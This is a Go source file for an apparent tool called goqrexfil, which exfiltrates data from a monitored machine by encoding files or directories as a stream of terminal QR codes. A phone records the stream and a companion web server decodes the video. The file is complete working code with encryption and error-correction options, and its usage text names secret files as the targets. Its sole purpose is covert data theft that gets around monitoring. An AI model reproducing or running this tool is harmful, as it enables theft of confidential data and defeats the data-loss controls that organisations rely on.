package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"image"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	log "github.com/sirupsen/logrus"
	"golang.org/x/crypto/blake2b"
	"golang.org/x/term"
)

const (
	serverPort        = "9999"                    // TCP port to run the web service on
	ffmpegQuality     = "16"                      // Quality for frames to images conversion. 1-31. 5 for great, 10 for acceptable
	ffmpegImageScale  = "scale='min(iw,1600)':-1" // Cap very large (4K) frames at 1600px wide; never downscale normal frames, since shrinking the QR below ~600px breaks recognition
	secsBeforeDisplay = 3                         // seconds before starting to display QR codes
	defaultDwell      = 300                       // default ms each frame is held (30fps-safe: >=3 camera frames + focus lock)
	defaultGrid       = 1                         // default QR codes per frame (1 fits a 120x40 terminal; 2 needs ~140 cols)
	gridGap           = 2                         // modules of gap between grid cells (on top of quiet zones)
	warmupSeconds     = 2                         // seconds to hold the warm-up pattern so auto-focus/exposure lock
	maxUploadSize     = 512 << 20                 // 512 MB upload cap
	defaultRedundancy = 50                        // default RaptorQ redundancy, in percent of k
	defaultJob        = "default"                 // job name when none is given
)

// Output locations are variables (not consts) so tests can redirect them to temp dirs.
var (
	videoLocation = "./public/video.mp4" // location of video uploaded to the web service
	payloadBase   = "./payload"          // base directory for per-job output
)

// jobPayloadPath / jobExtractDir are the per-job output locations.
func jobPayloadPath(jobName string) string {
	return filepath.Join(payloadBase, "jobs", jobName, "payload.bin")
}
func jobExtractDir(jobName string) string {
	return filepath.Join(payloadBase, "jobs", jobName, "extracted")
}

// ffmpegPath resolves the ffmpeg binary, preferring PATH and falling back to
// common install locations (Homebrew on Apple Silicon/Intel, MacPorts).
func ffmpegPath() string {
	if p, err := exec.LookPath("ffmpeg"); err == nil {
		return p
	}
	for _, p := range []string{
		"/opt/homebrew/bin/ffmpeg",
		"/usr/local/bin/ffmpeg",
		"/opt/local/bin/ffmpeg",
		"/usr/bin/ffmpeg",
	} {
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	return "ffmpeg"
}

// jobState tracks one exfiltration job (a payload being assembled from one or
// more video uploads).
type jobState struct {
	name     string
	dec      *decoder
	complete bool
	dest     string
	files    int
	hash     string
	code     string
}

// jobRegistry holds all jobs. Access to the map is guarded; access to an
// individual job's decoder is serialized by processingMu (see processVideoForJob).
type jobRegistry struct {
	mu   sync.Mutex
	jobs map[string]*jobState
}

func newJobRegistry() *jobRegistry { return &jobRegistry{jobs: make(map[string]*jobState)} }

func (r *jobRegistry) get(name, key string) *jobState {
	r.mu.Lock()
	defer r.mu.Unlock()
	j, ok := r.jobs[name]
	if !ok {
		j = &jobState{name: name, dec: newDecoder(key)}
		r.jobs[name] = j
	}
	return j
}

func (r *jobRegistry) all() []*jobState {
	r.mu.Lock()
	defer r.mu.Unlock()
	out := make([]*jobState, 0, len(r.jobs))
	for _, j := range r.jobs {
		out = append(out, j)
	}
	sort.Slice(out, func(i, k int) bool { return out[i].name < out[k].name })
	return out
}

// processingMu serializes video processing so concurrent uploads don't clobber
// the shared ./public frame directory or a job's decoder.
var processingMu sync.Mutex

// savePayload writes the reassembled payload for a job, unpacking directory
// payloads and verifying their manifest. Returns the file count and destination.
func savePayload(payload []byte, jobName string) (int, string, error) {
	if isTarGZ(payload) {
		dest := jobExtractDir(jobName)
		n, err := extractDirectoryPayload(payload, dest)
		return n, dest, err
	}
	dest := jobPayloadPath(jobName)
	if err := writePayloadFile(payload, dest); err != nil {
		return 0, "", err
	}
	return 0, dest, nil
}

// processVideoForJob extracts frames from the uploaded video and feeds the QR
// symbols to the named job's decoder. It stops as soon as the payload is
// reconstructable. Multiple uploads to the same job accumulate symbols, so a
// large transfer can span several recordings.
func processVideoForJob(reg *jobRegistry, jobName, key string) *jobState {
	processingMu.Lock()
	defer processingMu.Unlock()

	files, err := filepath.Glob("./public/*png")
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[***] Cleaning old files and extracting video frames")
	for _, f := range files {
		if err := os.Remove(f); err != nil {
			log.Fatal(err)
		}
	}

	cmd := exec.Command(ffmpegPath(), "-i", videoLocation,
		"-loglevel", "error",
		"-qscale:v", ffmpegQuality,
		"-vf", ffmpegImageScale,
		"-vsync", "vfr",
		"./public/%03d.png")
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		log.Fatal(err)
	}

	job := reg.get(jobName, key)
	dec := job.dec
	matches, _ := filepath.Glob("./public/*png")
	fmt.Println("[***] Extracting symbols from", len(matches), "frames (job:", jobName+")")
	lastReport := 0
frames:
	for _, match := range matches {
		f, err := os.Open(match)
		if err != nil {
			continue
		}
		img, _, err := image.Decode(f)
		_ = f.Close()
		if err != nil {
			continue
		}
		for _, raw := range decodeAll(img, 8) {
			mode, blobLen, id, sym, ok := parseSymbol(raw)
			if !ok {
				fmt.Println("[!] Skipping frame", match, "with unrecognized format")
				continue
			}
			done, err := dec.add(mode, blobLen, id, sym)
			if err != nil {
				log.Errorf("decoder: %v", err)
				continue
			}
			if r := dec.receivedCount(); r > lastReport+24 {
				lastReport = r
				fmt.Printf("[*] received %d symbols (need ~%d)\n", r, dec.baseSymbols())
			}
			if done && !job.complete {
				payload, err := dec.finish()
				if err != nil {
					log.Fatalf("reconstruct: %v", err)
				}
				n, dest, err := savePayload(payload, jobName)
				if err != nil {
					log.Fatalf("save payload: %v", err)
				}
				h := blake2b.Sum256(payload)
				job.complete = true
				job.dest = dest
				job.files = n
				job.hash = fmtHash(h[:])
				job.code = humanCode(h[:])
				fmt.Printf("[*] Payload reconstructed from %d symbols (need ~%d)\n", dec.receivedCount(), dec.baseSymbols())
				if n > 0 {
					fmt.Println("[*] Directory payload:", n, "files extracted to", dest)
				} else {
					fmt.Println("[*] Payload saved as", dest)
				}
				fmt.Println("Payload hash", job.hash)
				fmt.Println("Verification code", job.code)
				break frames
			}
		}
	}

	// Video exhausted; if we didn't finish, report progress toward completion.
	if !job.complete && dec.ready() {
		if payload, err := dec.finish(); err == nil {
			n, dest, _ := savePayload(payload, jobName)
			h := blake2b.Sum256(payload)
			job.complete, job.dest, job.files, job.hash, job.code = true, dest, n, fmtHash(h[:]), humanCode(h[:])
		} else {
			fmt.Printf("[*] Job %s: %d symbols received (need ~%d) - upload more video to continue\n", jobName, dec.receivedCount(), dec.baseSymbols())
		}
	}
	return job
}

func fmtHash(b []byte) string {
	const hexdigits = "0123456789abcdef"
	out := make([]byte, 0, len(b)*2)
	for _, v := range b {
		out = append(out, hexdigits[v>>4], hexdigits[v&0xF])
	}
	return string(out)
}

func writePayloadFile(payload []byte, filename string) error {
	if err := os.MkdirAll(filepath.Dir(filename), 0755); err != nil {
		return err
	}
	_ = os.Remove(filename)
	file, err := os.OpenFile(filename, os.O_WRONLY|os.O_TRUNC|os.O_CREATE, 0600)
	if err != nil {
		return err
	}
	if _, err := file.Write(payload); err != nil {
		file.Close()
		return err
	}
	return file.Close()
}

// tokenMiddleware, when token is non-empty, requires the token (query param or
// form field) on the request.
func tokenMiddleware(token string) gin.HandlerFunc {
	return func(c *gin.Context) {
		if token == "" {
			c.Next()
			return
		}
		provided := c.Query("token")
		if provided == "" {
			provided = c.PostForm("token")
		}
		if provided != token {
			c.String(http.StatusUnauthorized, "missing or invalid token")
			c.Abort()
			return
		}
		c.Next()
	}
}

// uploadForm renders the upload page with a job field, embedding the token.
func uploadForm(token string) string {
	tokenField := ""
	if token != "" {
		tokenField = fmt.Sprintf("<input type=\"hidden\" name=\"token\" value=\"%s\">", token)
	}
	return `<html lang="en-us"><body>
<h2>goqrexfil</h2>
<p>Upload a video you recorded of the QR stream. Use the same job name for every
video of one transfer - symbols accumulate across uploads.</p>
<form action="/upload" enctype="multipart/form-data" method="POST">
` + tokenField + `    <label>Job <input type="text" name="job" value="default"></label><br>
    <input accept="*" name="file" type="file"/>
    <button type="submit">submit</button>
</form>
<p><a href="/jobs">view jobs</a></p>
</body></html>`
}

func webService(token, key string, tlsEnabled bool, certFile, keyFile string) {
	gin.SetMode("release")
	router := gin.New()
	router.MaxMultipartMemory = maxUploadSize
	router.Use(tokenMiddleware(token))
	reg := newJobRegistry()

	router.GET("/", func(c *gin.Context) {
		c.String(http.StatusOK, uploadForm(token))
	})
	router.GET("/jobs", func(c *gin.Context) {
		var b []byte
		b = append(b, "<html><body><h2>Jobs</h2><ul>"...)
		for _, j := range reg.all() {
			status := "in progress"
			if j.complete {
				status = fmt.Sprintf("complete (%s)", j.code)
			}
			b = append(b, fmt.Sprintf("<li>%s: %s - %d/%d symbols</li>", j.name, status, j.dec.receivedCount(), j.dec.baseSymbols())...)
		}
		b = append(b, "</ul></body></html>"...)
		c.String(http.StatusOK, string(b))
	})
	router.GET("/payload", func(c *gin.Context) {
		jobName := c.Query("job")
		if jobName == "" {
			jobName = defaultJob
		}
		path := jobPayloadPath(jobName)
		if _, err := os.Stat(path); err != nil {
			c.String(http.StatusNotFound, "no payload available for job "+jobName)
			return
		}
		c.Header("Content-Disposition", "attachment; filename="+filepath.Base(path))
		c.Header("Content-Type", "application/octet-stream")
		c.File(path)
	})
	router.POST("/upload", func(c *gin.Context) {
		jobName := c.PostForm("job")
		if jobName == "" {
			jobName = c.Query("job")
		}
		if jobName == "" {
			jobName = defaultJob
		}
		file, err := c.FormFile("file")
		if err != nil {
			c.String(http.StatusBadRequest, fmt.Sprintf("get form err: %s", err.Error()))
			return
		}
		if err := c.SaveUploadedFile(file, videoLocation); err != nil {
			c.String(http.StatusBadRequest, fmt.Sprintf("upload file err: %s", err.Error()))
			return
		}
		log.Println("\n[*] File received (job:", jobName+")")

		job := processVideoForJob(reg, jobName, key)
		var myLink string
		switch {
		case job.complete:
			if job.files > 0 {
				myLink = fmt.Sprintf("<b>Job %s complete: %d files</b> extracted to <code>%s</code>. Verification code <b>%s</b>.", jobName, job.files, job.dest, job.code)
			} else {
				myLink = fmt.Sprintf("<b>Job %s complete.</b> <a href='/payload?job=%s'>download payload</a>. Verification code <b>%s</b>.", jobName, jobName, job.code)
			}
		case job.dec.ready():
			myLink = fmt.Sprintf("<b>Job %s in progress: %d symbols (need ~%d).</b> Upload more video of the same job to continue.", jobName, job.dec.receivedCount(), job.dec.baseSymbols())
		default:
			myLink = "<b>No payload retrieved.</b>"
		}
		if _, err = c.Writer.Write([]byte(myLink)); err != nil {
			log.Fatal("Cannot write response")
		}
	})
	router.Static("/process", "./public")

	srv := &http.Server{Addr: ":" + serverPort, Handler: router}
	if tlsEnabled {
		cert, fp, err := loadOrGenerateTLS(certFile, keyFile)
		if err != nil {
			log.Fatal(err)
		}
		if certFile == "" || keyFile == "" {
			fmt.Println("[*] Using self-signed certificate, SHA-256 fingerprint:")
			fmt.Println("   ", fp)
		}
		srv.TLSConfig = &tls.Config{Certificates: []tls.Certificate{cert}}
		log.Info("Serving TLS on port ", serverPort)
		if err := srv.ListenAndServeTLS("", ""); err != nil {
			log.Fatal(err)
		}
		return
	}
	log.Info("Serving on port ", serverPort)
	if err := srv.ListenAndServe(); err != nil {
		log.Fatal(err)
	}
}

// clientMode reads the payload, encodes it as a RaptorQ symbol stream, and
// displays a (sub-)range of symbols as terminal QR codes for video recording.
func clientMode(path string, redundancy, symbolSize, dwell, grid int, key, job string, start, count int, dryRun, noQuiet, noWarmup bool) {
	fmt.Println("[***] Client mode: ON")
	data, name, err := resolvePayloadSource(path)
	if err != nil {
		log.Fatalf("failed to read payload: %s", err)
	}
	if len(data) == 0 {
		log.Fatalf("No data read from source %q", name)
	}
	h := blake2b.Sum256(data)
	fmt.Println("[*] Source:", name, "("+humanSize(int64(len(data)))+")")
	fmt.Println("Plaintext hash", fmtHash(h[:]))
	fmt.Println("Verification code", humanCode(h[:]))
	if key != "" {
		fmt.Println("[*] Encryption: ON")
	}
	if grid < 1 {
		grid = 1
	}
	if dwell < 100 {
		dwell = 100
	}
	qz := 4
	if noQuiet {
		qz = 0
	}

	// Resolve the symbol size. --symbol-size 0 (default) auto-fits the largest
	// QR that fits the detected terminal, so it never clips on 80x24 cmd.exe,
	// Terminal.app, Windows Terminal, etc.
	if symbolSize <= 0 {
		cols, rows := terminalSize()
		if cols > 0 && rows > 0 {
			fit := fitSymbolSize(grid, cols, rows, qz)
			if fit > 0 {
				symbolSize = fit
			}
			fmt.Printf("[*] Terminal %dx%d: auto-fit symbol size = %d B\n", cols, rows, symbolSize)
			if fit <= 0 {
				log.Fatalf("Terminal %dx%d is too small for a QR code. Enlarge it (or use --no-quiet-zone / a wider terminal) and retry.", cols, rows)
			}
			if fit < 24 {
				fmt.Println("[!] That's a very small QR (slow transfer). Enlarge the terminal for a faster, more reliable transfer.")
			}
		}
		if symbolSize <= 0 {
			symbolSize = defaultSymbolSize
			fmt.Printf("[!] Could not detect terminal size; using %d B/symbol. Use a larger terminal or --symbol-size.\n", symbolSize)
		}
	}

	framed, k, mode, err := encodePayload(data, redundancy, symbolSize, key)
	if err != nil {
		log.Fatalf("encode: %v", err)
	}
	m := len(framed)

	// Apply the --start/--count range (for splitting a transfer across videos).
	// --start is 1-based (first symbol id to display); --count 0 means "to the end".
	from := start - 1
	if from < 0 {
		from = 0
	}
	if from > m {
		from = m
	}
	to := m
	if count > 0 {
		to = from + count
		if to > m {
			to = m
		}
	}
	selected := framed[from:to]
	// Frames: each frame shows `grid` symbols side by side.
	nFrames := (len(selected) + grid - 1) / grid
	secs := float64(nFrames) * float64(dwell) / 1000

	fmt.Printf("\n[*] %d base symbols, %d total (redundancy %d%%, mode %s, %d B/symbol)\n", k, m, redundancy, mode, symbolSize)
	fmt.Printf("[*] This video: symbols %d-%d (%d of %d) in %d frames (%d/frame, %dms dwell)\n",
		from+1, to, len(selected), m, nFrames, grid, dwell)
	fmt.Printf("[*] Estimated recording time: ~%.0fs\n", secs)

	if dryRun {
		fmt.Println("[*] Dry run: nothing displayed.")
		return
	}

	// Warn if the frame is wider/taller than the terminal (only possible if the
	// user forced a too-large --symbol-size, since auto-fit prevents it).
	if w, rth, err := gridTerminalSize(selected, grid, qz, gridGap); err == nil {
		if cols, rows := terminalSize(); cols > 0 && rows > 0 {
			if w > cols {
				fmt.Printf("[!] Frame is ~%d columns wide but terminal is %d. Widen the terminal or lower --symbol-size%s.\n",
					w, cols, hintNoQuiet(noQuiet))
			}
			if rth > rows {
				fmt.Printf("[!] Frame is ~%d rows tall but terminal is %d. Use a taller terminal, --grid 1, or lower --symbol-size.\n", rth, rows)
			}
		}
	}

	// Warm-up: hold a stable high-contrast pattern so the phone's auto-focus and
	// exposure lock before the real stream starts.
	if !noWarmup {
		for t := warmupSeconds; t > 0; t-- {
			_ = displayQRTerminal("GOQREFIL-WARMUP", fmt.Sprintf("Warming up - start recording now (%ds)", t), qz)
			time.Sleep(time.Second)
		}
	}

	fmt.Println("[***] Point your phone at this terminal; the stream starts in >", secsBeforeDisplay, "< seconds ****")
	time.Sleep(secsBeforeDisplay * time.Second)

	for f := 0; f < nFrames; f++ {
		time.Sleep(time.Duration(dwell) * time.Millisecond)
		lo := f * grid
		hi := lo + grid
		if hi > len(selected) {
			hi = len(selected)
		}
		cells := selected[lo:hi]
		caption := fmt.Sprintf("goqrexfil  job %s  %s  frame %d/%d  symbol %d/%d",
			job, progressBar(f+1, nFrames, 12), f+1, nFrames, lo+1, m)
		if len(cells) == 1 {
			if err := displayQRTerminal(cells[0], caption, qz); err != nil {
				log.Fatalf("display: %v", err)
			}
		} else {
			if err := displayGridTerminal(cells, grid, qz, gridGap, caption); err != nil {
				log.Fatalf("display: %v", err)
			}
		}
	}
	time.Sleep(time.Duration(dwell) * time.Millisecond)
	fmt.Printf("\x1b[2J\x1b[HDone - stop recording.\nJob: %s\nVerification code: %s\n", job, humanCode(h[:]))
}

func hintNoQuiet(noQuiet bool) string {
	if noQuiet {
		return ""
	}
	return " (or re-run with --no-quiet-zone to save 8 columns)"
}

// terminalSize returns the visible terminal dimensions (cols, rows), 0 if unknown.
// It uses the platform TTY query (works on Windows conhost/Windows Terminal, macOS
// Terminal, and Linux), falling back to $COLUMNS/$LINES. This matters because
// cmd.exe/Windows Terminal do not set $COLUMNS.
func terminalSize() (int, int) {
	if cols, rows, err := term.GetSize(int(os.Stdout.Fd())); err == nil && cols > 0 && rows > 0 {
		return cols, rows
	}
	cols := 0
	if c := os.Getenv("COLUMNS"); c != "" {
		fmt.Sscanf(c, "%d", &cols)
	}
	rows := 0
	if c := os.Getenv("LINES"); c != "" {
		fmt.Sscanf(c, "%d", &rows)
	}
	return cols, rows
}

// fitSymbolSize returns the largest RaptorQ symbol size (bytes) whose rendered QR
// grid fits the terminal (cols x rows), reserving 2 rows for the caption. It
// binary-searches the symbol size, measuring a real framed symbol each time.
// Returns 0 if even the smallest QR is too big.
func fitSymbolSize(grid, cols, rows, quiet int) int {
	if cols <= 0 || rows <= 0 {
		return 0
	}
	usableH := rows - 2 // reserve caption rows
	fits := func(symbolSize int) bool {
		// A real framed symbol of this size (max-length header + base64 body).
		sym := make([]byte, symbolSize)
		framed := formatSymbol(modeCompressed, 9999999, 99999, sym)
		dummy := make([]string, grid)
		for i := range dummy {
			dummy[i] = framed
		}
		w, h, err := gridTerminalSize(dummy, grid, quiet, gridGap)
		return err == nil && w <= cols && h <= usableH
	}
	lo, hi, best := 4, 240, 0
	for lo <= hi {
		mid := (lo + hi) / 2
		if fits(mid) {
			best, lo = mid, mid+1
		} else {
			hi = mid - 1
		}
	}
	return best
}

func selfTest(data []byte, key string) {
	fmt.Println("[***] Self-test mode: local QR round-trip, no camera needed")
	framed, k, mode, err := encodePayload(data, defaultRedundancy, defaultSymbolSize, key)
	if err != nil {
		log.Fatalf("encode: %v", err)
	}
	m := len(framed)
	fmt.Printf("[*] %d base symbols, %d total (mode %s, %d B/symbol)\n", k, m, mode, defaultSymbolSize)

	dir, err := os.MkdirTemp("", "goqrexfil-selftest-")
	if err != nil {
		log.Fatal(err)
	}
	defer os.RemoveAll(dir)

	dec := newDecoder(key)
	// Simulate a lossy grid capture: pack symbols into 2-wide frames, and drop
	// one frame in five (80% capture). Each frame is a composed grid PNG.
	const grid = 2
	nFrames := (m + grid - 1) / grid
	kept := 0
	for f := 0; f < nFrames; f++ {
		if f%5 == 4 {
			continue // dropped frame
		}
		lo := f * grid
		hi := lo + grid
		if hi > m {
			hi = m
		}
		cells := framed[lo:hi]
		pngBytes := composeGridPNG(cells, grid, 8, 4, 8)
		if err := os.WriteFile(filepath.Join(dir, fmt.Sprintf("%04d.png", f)), pngBytes, 0644); err != nil {
			log.Fatal(err)
		}
		kept += len(cells)
	}
	fmt.Println("[*] Wrote", kept, "of", m, "symbols across", nFrames, "grid frames (80% captured) to", dir)

	matches, _ := filepath.Glob(filepath.Join(dir, "*.png"))
	for _, match := range matches {
		f, err := os.Open(match)
		if err != nil {
			log.Fatal(err)
		}
		img, _, err := image.Decode(f)
		_ = f.Close()
		if err != nil {
			log.Fatal(err)
		}
		for _, raw := range decodeAll(img, grid) {
			mode2, blobLen, id, sym, ok := parseSymbol(raw)
			if !ok {
				log.Fatalf("FAIL: could not parse QR in %s", match)
			}
			if _, err := dec.add(mode2, blobLen, id, sym); err != nil {
				log.Fatalf("FAIL: decoder error: %v", err)
			}
		}
	}

	out, err := dec.finish()
	if err != nil {
		log.Fatalf("FAIL: %v", err)
	}
	if string(out) != string(data) {
		log.Fatalf("FAIL: payload mismatch (got %d bytes, want %d)", len(out), len(data))
	}
	hh := blake2b.Sum256(out)
	fmt.Println("[*] PASS: round-trip OK from 80% of symbols, verification code", humanCode(hh[:]))
}

func main() {
	log.SetFormatter(&log.TextFormatter{})
	isServer := flag.Bool("server", false, "Server mode")
	isClient := flag.Bool("client", false, "Client mode")
	isSelfTest := flag.Bool("selftest", false, "Self-test: encode and decode QRs locally, no camera needed")
	isProcessing := flag.Bool("retrievePayload", false, "Processing existing video only (debug mode)")
	token := flag.String("token", "", "Server: require this shared token on upload/download")
	key := flag.String("key", "", "Encrypt/decrypt the payload with this passphrase (AES-256-GCM)")
	tlsEnabled := flag.Bool("tls", false, "Server: serve over TLS (self-signed if no cert/key given)")
	tlsCert := flag.String("tls-cert", "", "Server: TLS certificate file (with --tls)")
	tlsKey := flag.String("tls-key", "", "Server: TLS key file (with --tls)")
	redundancy := flag.Int("redundancy", defaultRedundancy, "Client: RaptorQ redundancy as % of base symbols")
	symbolSize := flag.Int("symbol-size", 0, "Client: raw bytes per QR symbol (0 = auto-fit to the terminal; smaller = smaller, more reliably-scanned QRs)")
	dwell := flag.Int("dwell", defaultDwell, "Client: ms each frame is held (300 is 30fps-safe; lower = faster but riskier)")
	grid := flag.Int("grid", defaultGrid, "Client: QR codes shown side-by-side per frame (2 = 2x1 grid)")
	job := flag.String("job", defaultJob, "Job name; uploads to the same job accumulate across videos")
	start := flag.Int("start", 1, "Client: first symbol id to display (1-based), for splitting a transfer")
	count := flag.Int("count", 0, "Client: number of symbols to display (0 = to the end)")
	dryRun := flag.Bool("dry-run", false, "Client: show symbol count and time estimate, display nothing")
	noQuiet := flag.Bool("no-quiet-zone", false, "Client: omit the QR quiet zone to save 8 columns")
	noWarmup := flag.Bool("no-warmup", false, "Client: skip the warm-up pattern")
	flag.Parse()

	if *isSelfTest {
		data, _, err := resolvePayloadSource(flag.Arg(0))
		if err != nil {
			log.Fatalf("failed to read payload: %s", err)
		}
		if len(data) == 0 {
			log.Fatalf("No data read from source")
		}
		selfTest(data, *key)
	} else if *isProcessing {
		log.Println("Processing only - DEBUG MODE")
		reg := newJobRegistry()
		_ = processVideoForJob(reg, *job, *key)
	} else if *isServer {
		fmt.Println("[*] Server mode: ON")
		webService(*token, *key, *tlsEnabled, *tlsCert, *tlsKey)
	} else if *isClient {
		path := ""
		if flag.NArg() > 0 {
			path = flag.Arg(0)
		}
		clientMode(path, *redundancy, *symbolSize, *dwell, *grid, *key, *job, *start, *count, *dryRun, *noQuiet, *noWarmup)
	} else {
		fmt.Println("goqrexfil - exfiltrate data as QR codes captured on video")
		fmt.Println()
		fmt.Println("Client (on the monitored machine):")
		fmt.Println("  cat top.secret.file | ./goqrexfil --client             display QR stream on stdin")
		fmt.Println("  ./goqrexfil --client ./secrets                         pack a directory and display")
		fmt.Println("  ./goqrexfil --client --key PASSPHRASE ./secrets        encrypt the payload")
		fmt.Println("  ./goqrexfil --client --dry-run ./secrets               show size/time estimate only")
		fmt.Println("  ./goqrexfil --client --redundancy 100 ./secrets        more redundancy (longer, more robust)")
		fmt.Println("  ./goqrexfil --client --grid 2 --dwell 300 ./secrets     2x1 grid, 300ms dwell (default)")
		fmt.Println("  ./goqrexfil --client --grid 1 --symbol-size 240 ./secrets  one big QR per frame")
		fmt.Println("  ./goqrexfil --client --job big --start 1 --count 20000  display a symbol range (split a transfer)")
		fmt.Println("  cat file | ./goqrexfil --selftest                      local round-trip test, no camera")
		fmt.Println()
		fmt.Println("Server (on your machine):")
		fmt.Println("  ./goqrexfil --server                                   web server on port 9999")
		fmt.Println("  ./goqrexfil --server --token SECRET                    require a shared token")
		fmt.Println("  ./goqrexfil --server --key PASSPHRASE                  decrypt encrypted payloads")
		fmt.Println("  ./goqrexfil --server --tls                             serve over TLS (self-signed)")
		fmt.Println("  ./goqrexfil --retrievePayload --job big                re-process ./public/video.mp4")
		fmt.Println()
		os.Exit(1)
	}
}
